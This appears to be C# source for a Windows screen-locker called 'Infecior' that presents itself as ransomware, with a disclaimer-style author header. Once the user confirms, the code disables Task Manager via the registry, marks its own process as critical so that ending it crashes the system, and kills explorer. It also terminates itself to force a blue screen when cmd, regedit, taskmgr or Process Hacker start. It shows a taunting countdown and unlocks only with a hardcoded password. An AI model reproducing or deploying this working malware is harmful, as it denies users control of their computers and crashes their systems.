/*
  Created by Cisamu
  (c) 2022 All right's reserved
  Don't use it on real machine
  contact: cisamusuppo@gmail.com
  my git - https://github.com/cisamu123
  the author is not responsible for your actions, everything is created in the introduction and no more.
  Thanks for read it!
 */
using Infecior.FORMS;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Infecior
{
    public partial class Form1 : Form
    {
        [DllImport("ntdll.dll")]
        private static extern int NtSetInformationProcess(IntPtr process, int process_class, ref int process_value, int length);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess_Kill(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        int hour;
        int minutes;
        int seconds;
        int status = 1;
        int isCritical = 1;
        int BreakOnTermination = 0x1D;
        public Form1()
        {
            InitializeComponent();
        }
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int bsodProtect(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        private void Form1_Load(object sender, EventArgs e)
        {
            DialogResult dialogResult = MessageBox.Show("IT'S RANSOMWARE, CONTINUE???", "Infecior", MessageBoxButtons.YesNo);
            if (dialogResult == DialogResult.Yes)
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                if (objRegistryKey.GetValue("DisableTaskMgr") == null)
                    objRegistryKey.SetValue("DisableTaskMgr", "1");
                seconds = Convert.ToInt32(60);
                minutes = Convert.ToInt32(59);
                hour = Convert.ToInt32(23);
                int isCritical = 1;
                int BreakOnTermination = 0x1D;
                Process.EnterDebugMode();
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                timer1.Start();
                try
                {
                    foreach (var process in Process.GetProcessesByName("explorer"))
                    {
                        process.Kill();
                    }
                    foreach (var process in Process.GetProcessesByName("control"))
                    {
                        process.Kill();
                        MessageBox.Show("Don't start it please :)");
                    }
                    foreach (var process in Process.GetProcessesByName("Process Hacker"))
                    {
                        NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref status, sizeof(int));
                        Process.GetCurrentProcess().Kill();
                        MessageBox.Show("Don't start it please :)");
                    }
                    foreach (var process in Process.GetProcessesByName("cmd"))
                    {
                        NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref status, sizeof(int));
                        Process.GetCurrentProcess().Kill();
                        MessageBox.Show("Don't start it please :)");
                    }
                    foreach (var process in Process.GetProcessesByName("regedit"))
                    {
                        NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref status, sizeof(int));
                        Process.GetCurrentProcess().Kill();
                        MessageBox.Show("Don't start it please :)");
                    }
                    foreach (var process in Process.GetProcessesByName("taskmgr"))
                    {
                        NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref status, sizeof(int));
                        Process.GetCurrentProcess().Kill();
                        MessageBox.Show("Don't start it please :)");
                    }
                }
                catch
                {

                }

            }
            else if (dialogResult == DialogResult.No)
            {
                Application.Exit();
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Thread.Sleep(1000);
            label1.Text = "TIME LEFT: " + hour.ToString() + ":" + minutes.ToString() + ":" + seconds--.ToString() + " ENJOY! :)";
            if (seconds < 0)
            {
                minutes--;
                seconds = 60;
            }
            if (minutes == 0)
            {
                hour--;
                minutes = 60;
            }
            if (hour == 0)
            {
                if (minutes == 0)
                {
                    if (seconds == 0)
                    {
                        NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref status, sizeof(int));
                        Process.GetCurrentProcess().Kill();
                        timer1.Stop();
                    }
                }
            }
            foreach (var process in Process.GetProcessesByName("explorer"))
            {
                process.Kill();
            }
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/cisamu123");
        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (textBox2.Text == "Y")
            {
                MessageBox.Show("HAHAHAHAHA YOU'RE IDIOT! DID YOU THOUGHT IT WOULD BE THIS EASY? NO, ENTER THE PASSWORD AND UNLOCK NORMALLY)");
            }
            if (textBox2.Text == "N")
            {
                MessageBox.Show("Ok...");
            }
            else
            {
                MessageBox.Show("DUDE I DON'T GET WHAT YOU SAID!");
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "7jaFV5-u9_f_2596NF~F^j)hHsSm2@!U_CISAMU")
            {
                Process.Start("explorer.exe");
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                objRegistryKey.DeleteValue("DisableTaskMgr");
                objRegistryKey.Close();
                MessageBox.Show("Succesfuly Decrypted!\n WARNING: after clicking on the OK button, you will get a blue screen of death. Don't worry, you will need to restart your PC. Since the virus will think that you killed the process of this virus. Nothing will happen to your system. But consider yourself very lucky, because if you restarted the PC when you simply did not enter the unlock key, the system would fly?");
                Application.Exit();
            }
            else
            {
                MessageBox.Show("Incorrect decryption key!");
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Info Inf = new Info();
            Inf.ShowDialog();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Rules Rule = new Rules();
            Rule.ShowDialog();
        }
    }
}
